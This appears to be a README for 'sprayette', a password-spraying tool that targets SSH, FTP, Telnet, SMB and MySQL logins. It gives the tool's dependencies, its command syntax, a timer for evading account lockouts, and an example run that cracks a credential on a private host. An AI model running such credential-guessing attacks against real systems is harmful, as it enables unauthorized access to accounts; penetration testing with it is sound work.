**PASSWORD SPRAY MULTI USE (PSMU) AKA SPRAYETTE***
# Introduction
	The idea of sprayette was to have a tool that it can be used to perform a password spray over multiple services,
	ssh,ftp,telnet,smb,mysql so far. With the possiblity of adding a timer for the process so it can "less noisy" and in some cases avoid an account lockout since its a brute force attack.


# Requisites
	argparse
	time
	telnetlib
	paramiko (SSH)
	mysql.connector
	ftplib

# Usage
	./sprayette.py PROTOCOL IP USERS_FILE_LIST PASS_FILE_LIST ATTEMPS TIMER(Minutes)
	optional -p --port to change the port depending on the services

# Example
	root@kali# ./sprayette.py ssh 192.168.0.146 user.txt passwords.txt 2 1
	[*] Trying with misc:qwerty -> Failed!!!
	[*] Trying with neo:qwerty -> Failed!!!
	[*] Trying with root:qwerty -> Failed!!!
	[*] Trying with misc:toor -> Success!!!
	[*] Trying with neo:toor -> Failed!!!
	[*] Trying with root:toor -> Failed!!!
	Going to sleep for 1 minutes
	Back on spray
	[*] Trying with neo:password -> Failed!!!
	[*] Trying with root:password -> Failed!!!
	Obtained the following credentials:
	misc:toor

